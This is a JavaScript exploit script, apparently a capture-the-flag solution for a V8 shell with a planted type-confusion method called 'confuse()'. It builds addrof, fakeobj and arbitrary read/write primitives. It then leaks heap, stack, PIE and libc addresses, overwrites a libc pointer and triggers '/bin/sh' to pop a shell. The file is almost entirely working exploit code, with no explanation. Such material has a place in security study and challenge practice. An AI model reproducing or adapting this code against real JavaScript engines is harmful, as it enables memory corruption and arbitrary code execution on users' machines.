/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
let DEBUG = false;

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function leak_all_addrof(obj) {
    let a = [obj];
//    if (DEBUG) %DebugPrint(obj)
    a.confuse();
    let leak = ftoi(a.at(0));
//    if (DEBUG) console.log("leak:    0x" + leak.toString(16));
    return [(leak & 0xffffffff00000000n) >> 32n, leak & 0xffffffffn]
}

function addrof(obj) {
    return leak_all_addrof(obj)[1]
}

function fakeobj(addr) {
    let array = [];
    array[0] = itof(addr);
    array.confuse();
    let fake_object = array[0];
    array.confuse();
    return fake_object;
}

function initial_arbitrary_read(addr) {
    let obj = [itof((map) + (0x725n << 32n)), itof((addr-0x8n) + (2n << 32n))];
    console.log(`[*] Crafted array: ${ftoi(obj[0]).toString(16)}, ${ftoi(obj[1]).toString(16)}`)
    console.log(`[*] Crafted object addr: ${addrof(obj).toString(16)}`)
    let fake_obj_addr = addrof(obj) + 0x64n;
    console.log(`[*] Addr of object: ${fake_obj_addr.toString(16)}`)
    let fake_obj = fakeobj(fake_obj_addr);
    // %DebugPrint(obj);
    // %DebugPrint(fake_obj);
    return fake_obj[0];
}

function initial_arbitrary_write(addr, value) {
    let obj = [itof((map) + (0x725n << 32n)), itof((addr-0x8n) + (4n << 32n))];
    console.log(`[*] Crafted array: ${ftoi(obj[0]).toString(16)}, ${ftoi(obj[1]).toString(16)}`)
    console.log(`[*] Crafted object addr: ${addrof(obj).toString(16)}`)
    let fake_obj_addr = addrof(obj) + 0x64n;
    console.log(`[*] Addr of object: ${fake_obj_addr.toString(16)}`)
    let fake_obj = fakeobj(fake_obj_addr);
    // %DebugPrint(obj);
    // %DebugPrint(fake_obj);
    fake_obj[0] = itof(value);
}

function arb_write(addr, val) {
    let buf = new ArrayBuffer(8);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 36n;
    initial_arbitrary_write(backing_store_addr, addr);
    // %DebugPrint(buf);
    dataview.setBigUint64(0, BigInt(val), true);
}

function arb_read(addr) {
    let buf = new ArrayBuffer(8);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 36n;
    initial_arbitrary_write(backing_store_addr, addr);
    // %DebugPrint(buf);
    return dataview.getBigUint64(0, true);
}

// SPLOIT GOES HERE

// Leak float map
let obj = [1.1];

// %DebugPrint(obj);

var map = leak_all_addrof(obj)[0]
console.log(`[+] double objects map: ${map.toString(16)}`)


var buf = new ArrayBuffer(8);
var dataview = new DataView(buf);
var buf_addr = addrof(buf);
var backing_store_addr = buf_addr + 36n;

console.log(`[*] backing store addr: ${backing_store_addr.toString(16)}`);

// %DebugPrint(buf)
heap_addr = ftoi(initial_arbitrary_read(backing_store_addr));
console.log(`[+] Heap addr leaked: ${heap_addr.toString(16)}`)

stack_addr = arb_read(heap_addr + 0x48n)
console.log(`[+] Stack addr leaked: ${stack_addr.toString(16)}`)

pie_addr = arb_read(stack_addr) - 0x1578n - 0x288b000n
console.log(`[+] PIE addr leaked: ${pie_addr.toString(16)}`)

libc_addr = arb_read(pie_addr + 0x290b6a8n) - 0x84420n
console.log(`[+] Libc addr leaked: ${libc_addr.toString(16)}`)

arb_write(libc_addr + 2027080n, libc_addr + 336528n)
console.log("/bin/sh\x00")
